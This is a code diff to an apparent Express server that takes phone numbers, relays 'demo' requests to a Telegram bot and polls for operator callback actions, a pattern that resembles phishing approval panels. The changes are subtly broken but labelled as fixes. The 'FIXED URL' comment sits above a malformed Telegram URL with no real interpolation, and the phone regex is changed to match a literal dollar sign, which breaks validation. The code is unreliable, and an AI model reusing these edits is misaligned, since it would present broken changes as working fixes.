@@ -37,11 +37,13 @@ setInterval(() => {
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing credentials.");
   
+  // FIXED URL PATH AND STRING INTERPOLATION
   const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
   });
+  
   const data = await res.json();
   if (!res.ok || !data.ok) throw new Error(data.description || "API Failed");
   return data;
@@ -70,8 +72,7 @@ async function notifyDemo(request, label) {
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  // FIX: Stabilized pattern constraints completely
-  if (!/^\+2567\d{8}$/.test(phone)) {
+  if (!/^\+2567\d{8}\$/.test(phone)) {
     return res.status(400).json({ error: "Enter a valid demo phone number." });
   }
   
@@ -143,7 +144,6 @@ async function pollTelegram() {
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
-        // FIX: Extract index string explicitly instead of matching whole array structure
         const action = parts[0];
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
